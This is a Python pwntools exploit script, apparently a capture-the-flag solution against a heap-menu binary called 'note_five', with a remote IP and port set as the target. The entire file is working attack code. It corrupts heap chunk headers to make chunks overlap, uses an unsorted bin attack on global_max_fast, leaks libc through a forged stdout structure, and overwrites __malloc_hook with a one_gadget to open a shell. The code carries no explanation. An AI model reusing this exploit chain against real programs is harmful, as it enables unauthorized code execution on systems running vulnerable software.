#-*- coding:utf-8 -*-
from pwn import *
debug=1
context.log_level = 'debug'
if debug:
    io = process('./note_five.dms')
else:
    client=remote("112.126.103.195",9999)
elf = ELF('./note_five.dms')
libc = ELF('./libc.so')

def new(idx,size):
    io.recvuntil('choice>> ')
    io.sendline('1')
    io.recvuntil('idx: ')
    io.sendline(str(idx))
    io.recvuntil('size: ')
    io.sendline(str(size))

def edit(idx,content):
    io.recvuntil('choice>> ')
    io.sendline('2')
    io.recvuntil('idx: ')
    io.sendline(str(idx))
    io.recvuntil('content: ')
    io.sendline(content)

def delete(idx):
    io.recvuntil('choice>> ')
    io.sendline('3')
    io.recvuntil('idx: ')
    io.sendline(str(idx))

#overlapping
new(4,0xf0-8)
new(0,0xf0-8)
new(1,0xa0-8)
new(2,0xf0-8)
new(3,0xf0-8)

content0=''
content0+='0'*(0xf0-8)
content0+='\xa1'
edit(0,content0)
delete(0)

content1=''
content1+='1'*(152-8)
content1+=p64(0xf0+0xa0)
content1+='\xf0'
edit(1,content1)

content2=''
content2+=p64(0xf1)*20
edit(2,content2)

content3=''
content3+='3'*(0xf0-8)
edit(3,content3)

delete(2)#free (012) to unsorted bin

new(0,0xf0+0xa0+0xf0-8)#malloc (012)
content0=''
content0+='0'*(0xf0-8)
content0+='\xa1'
edit(0,content0)

content1=''
content1+='1'*(0xa0-8)
content1+='\xf1'
edit(1,content1)

delete(1)#free 1 to unsorted bin


#guess offset
guess_offset = 3#1/16
global_max_fast = (guess_offset << 12) | 0x7f8
stdout = global_max_fast-0x11d8

#unsorted bin attack to change global_max_fast
content0=''
content0+='0'*(0xf0-8)
content0+=p64(0xa1)
content0+=p64(0x0)#fd
content0+=p16(global_max_fast-0x10)#bk
edit(0,content0)
new(1,0xa0-8)#global_max_fast


content0=''
content0+='@'*(0xf0-8)
content0+=p64(0xf1)
edit(0,content0)

#fast bin attack change the stdout leak libcbase
delete(1)
content0=''
content0+='@'*(0xf0-8)
content0+=p64(0xf1)
content0+=p16(stdout-0x51)
edit(0,content0)

new(1,0xf0-8)
new(4,0xf0-8)

fake=''
fake+='0'*0x41
fake+=p64(0xfbad1800)#stdout->flags
fake+=p64(0x0)*3
fake+=p16(stdout+0x20)#stdout->_IO_write_base
edit(4,fake)

libc.address = u64(io.recvuntil('info')[0:8])-0x3c5640

one_gadgets=[0x45216,0x4526a,0xf02a4,0xf1147]#rax 30 50 70
one_gadget=libc.address+one_gadgets[1]

#change malloc_hook
delete(1)
content0=''
content0+='@'*(0xf0-8)
content0+=p64(0xf1)
content0+=p64(libc.symbols['__malloc_hook']-0x1a1)
edit(0,content0)

new(2,0xf0-8)
new(3,0xf0-8)#fake chunk 1
fake_size=''
fake_size+='\x00'*(0xf0-0x10+1)
fake_size+=p64(0xf1)
edit(3,fake_size)

delete(2)
content0=''
content0+='@'*(0xf0-8)
content0+=p64(0xf1)
content0+=p64(libc.symbols['__malloc_hook']-0xb8)
edit(0,content0)

new(1,0xf0-8)
new(1,0xf0-8)#fake chunk 2
fake_mh=''
fake_mh+='\x00'*(0xa0)
fake_mh+=p64(one_gadget)
fake_mh+=p64(libc.symbols['realloc']+13)
edit(1,fake_mh)

#getshell
new(4,1000)

io.interactive()